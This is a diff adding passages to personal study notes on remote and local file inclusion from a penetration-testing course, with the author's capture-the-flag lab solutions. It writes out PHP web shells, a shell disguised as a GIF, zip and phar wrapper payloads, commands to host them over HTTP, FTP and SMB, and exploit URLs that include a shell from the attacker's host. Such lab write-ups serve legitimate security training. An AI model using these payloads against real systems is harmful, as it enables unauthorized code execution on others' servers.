@@ -428,9 +428,201 @@ That reveals the flags name, then I can just do cat and get the answer.
 
 ## Remote File Inclusion (RFI)
 
+So far in this module, we have been mainly focusing on Local File Inclusion (LFI). However, in some cases, we may also be able to include remote files "Remote File Inclusion (RFI)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:
 
+    Enumerating local-only ports and web applications (i.e. SSRF)
+    Gaining remote code execution by including a malicious script that we host
+
+In this section, we will cover how to gain remote code execution through RFI vulnerabilities. The Server-side Attacks module covers various SSRF techniques, which may also be used with RFI vulnerabilities.
+
+When a vulnerable function allows us to include remote files, we may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain remote code execution. If we refer to the table on the first section, we see that the following are some of the functions that (if vulnerable) would allow RFI:
+
+As we can see, almost any RFI vulnerability is also an LFI vulnerability, as any function that allows including remote URLs usually also allows including local ones. However, an LFI may not necessarily be an RFI. This is primarily because of three reasons:
+
+    The vulnerable function may not allow including remote URLs
+    You may only control a portion of the filename and not the entire protocol wrapper (ex: http://, ftp://, https://).
+    The configuration may prevent RFI altogether, as most modern web servers disable including remote files by default.
+
+Furthermore, as we may note in the above table, some functions do allow including remote URLs but do not allow code execution. In this case, we would still be able to exploit the vulnerability to enumerate local ports and web applications through SSRF.
+
+In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the allow_url_include setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:
+
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+
+However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (http://127.0.0.1:80/index.php) as our input string and see if it gets included: 
+
+As we can see, the index.php page got included in the vulnerable section (i.e. History Description), so the page is indeed vulnerable to RFI, as we are able to include URLs. Furthermore, the index.php page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow us to execute code if we include a malicious PHP script that we host on our machine.
+
+We also see that we were able to specify port 80 and get the web application on that port. If the back-end server hosted any other local web applications (e.g. port 8080), then we may be able to access them through the RFI vulnerability by applying SSRF techniques on it.
+
+Note: It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.
+
+The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case:
+
+`echo '<?php system($_GET["cmd"]); ?>' > shell.php`
+
+Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like 80 or 443, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, we may host the script through an FTP service or an SMB service, as we will see next.
+
+Now, we can start a server on our machine with a basic python server with the following command, as follows:
+
+`sudo python3 -m http.server <LISTENING_PORT>`
+
+Now, we can include our local shell through RFI, like we did earlier, but using <OUR_IP> and our <LISTENING_PORT>. We will also specify the command to be executed with &cmd=id: 
+
+As we can see, we did get a connection on our python server, and the remote shell was included, and we executed the specified command:
+
+Tip: We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload
+
+As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's pyftpdlib, as follows:
+
+`python -m pyftpdlib -p 21`
+
+This may also be useful in case http ports are blocked by a firewall or the http:// string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the ftp:// scheme in the URL, as follows: 
+
+`ftp://<OUR_IP>/shell.php&cmd=id`
+
+As we can see, this worked very similarly to our http attack, and the command was executed. By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:
+
+`curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'`
+
+If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
+
+We can spin up an SMB server using Impacket's smbserver.py, which allows anonymous authentication by default, as follows:
+
+`impacket-smbserver -smb2support share $(pwd)`
+
+Now, we can include our script by using a UNC path (e.g. \\<OUR_IP>\share\shell.php), and specify the command with (&cmd=whoami) as we did earlier: 
+
+`\\<OUT_IP>\share\shell.php&cmd=whoami`
+
+As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. However, we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.
+
+-----------------
+The question in this section is:
+Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in / 
+
+Checking for RFI first:
+`http://10.129.29.114/index.php?language=http://127.0.0.1:80/index.php`
+And it works.
+
+So lets host a shell:
+```
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+python3 -m http.server 8080
+```
+
+`http://10.129.29.114/index.php?language=http://10.10.14.113:8080/shell.php&cmd=id`
+
+And that works. So all we need to do is find the flag.
+
+`http://10.129.29.114/index.php?language=http://10.10.14.113:8080/shell.php&cmd=ls+/`
+This shows that there is a directory called exercise.
+
+And under that directory is the flag.
 
 ## LFI and File Uploads
+
+File upload functionalities are ubiquitous in most modern web applications, as users usually need to configure their profile and usage of the web application by uploading their data. For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability.
+
+The File Upload Attacks module covers different techniques on how to exploit file upload forms and functionalities. However, for the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files. If the vulnerable function has code Execute capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. image.jpg), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
+
+As mentioned in the first section, the following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:
+
+
+```
+Function 			Read Content 	Execute 	Remote URL
+PHP 			
+include()/include_once() 	✅ 		✅ 		✅
+require()/require_once() 	✅ 		✅ 		❌
+NodeJS 			
+res.render() 			✅ 		✅ 		❌
+Java 			
+import 				✅ 		✅ 		✅
+.NET 			
+include 			✅ 		✅ 		✅
+```
+
+Image upload is very common in most modern web applications, as uploading images is widely regarded as safe if the upload function is securely coded. However, as discussed earlier, the vulnerability, in this case, is not in the file upload form but the file inclusion functionality.
+
+Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. shell.gif), and should also include the image magic bytes at the beginning of the file content (e.g. GIF8), just in case the upload form checks for both the extension and content type as well. We can do so as follows:
+
+`echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
+
+This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.
+
+Note: We are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII characters, while other extensions have magic bytes in binary that we would need to URL encode. However, this attack would work with any allowed image or file type. The File Upload Attacks module goes more in depth for file type attacks, and the same logic can be applied here.
+
+Now, we need to upload our malicious image file. To do so, we can go to the Profile Settings page and click on the avatar image to select our image, and then click on upload and our image should get successfully uploaded: 
+
+Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:
+
+``` html
+<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
+```
+
+Note: As we can see, we can use `/profile_images/shell.gif` for the file path. If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide the uploaded files.
+
+With the uploaded file path at hand, all we need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed, as follows: 
+
+As we can see, we included our file and successfully executed the id command.
+
+Note: To include to our uploaded file, we used ./profile_images/ as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to ../ out of that directory and then use our URL path, as we learned in previous sections.
+
+As mentioned earlier, the above technique is very reliable and should work in most cases and with most web frameworks, as long as the vulnerable function allows code execution. There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.
+
+We can utilize the zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named shell.jpg), as follows:
+
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+
+Note: Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.
+
+Once we upload the shell.jpg archive, we can include it with the zip wrapper as (zip://shell.jpg), and then refer to any files within it with #shell.php (URL encoded). Finally, we can execute commands as we always do with &cmd=id, as follows: 
+
+`zip://./profile_images/shell.jpg%23shell.php&cmd=id`
+
+As we can see, this method also works in executing commands through zipped PHP scripts.
+
+Note: We added the uploads directory (./profile_images/) before the file name, as the vulnerable page (index.php) is in the main directory.
+
+Finally, we can use the phar:// wrapper to achieve a similar result. To do so, we will first write the following PHP script into a shell.php file:
+
+``` php
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+```
+
+This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. We can compile it into a phar file and rename it to shell.jpg as follows
+
+`php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`
+
+Now, we should have a phar file called shell.jpg. Once we upload it to the web application, we can simply call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (&cmd=id), as follows: 
+
+`phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`
+
+As we can see, the id command was successfully executed. Both the zip and phar wrapper methods should be considered as alternative methods in case the first method did not work, as the first method we discussed is the most reliable among the three.
+
+--------------
+The question in this section is:
+Use any of the techniques covered in this section to gain RCE and read the flag at / 
+
+First lets create a shell:
+`echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`
+
+Then we upload it.
+
+Viewing the source we know that it is located here: /profile_images/shell.gif.
+
+Then we can try:
+`http://94.237.54.176:52209/index.php?language=./profile_images/shell.gif&cmd=id`
+
+And it works.
+
+So now we just find the flag.
 
 ## Log Poisoning
 
